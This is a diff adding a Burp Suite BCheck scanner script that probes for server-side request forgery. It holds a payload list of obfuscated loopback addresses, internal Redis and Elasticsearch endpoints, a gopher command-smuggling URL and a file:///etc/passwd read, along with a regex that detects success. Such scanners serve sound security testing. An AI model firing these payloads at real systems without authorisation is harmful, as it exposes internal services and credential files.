@@ -1,0 +1,29 @@
+metadata:
+    language: v2-beta
+    name: "SSRF - Internal Network Probing"
+    description: "Tests SSRF for internal service access with IP format obfuscation"
+    author: "BCheck Arsenal"
+    tags: "ssrf", "internal", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "http://127.0.0.1/"
+            - "http://localhost/"
+            - "http://[::1]/"
+            - "http://127.1/"
+            - "http://0/"
+            - "http://0x7f000001/"
+            - "http://127.0.0.1:6379/INFO"
+            - "http://127.0.0.1:9200/_cluster/health"
+            - "gopher://127.0.0.1:6379/_INFO%0D%0A"
+            - "file:///etc/passwd"
+
+    if {check.response} matches "(redis_version|cluster_name|elasticsearch|consul|root:x:|127\.0\.0\.1)" then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: "SSRF with internal network access detected. Application can reach internal services."
+            remediation: "Use URL allowlists. Block internal IPs and non-HTTP protocols."
+    end if
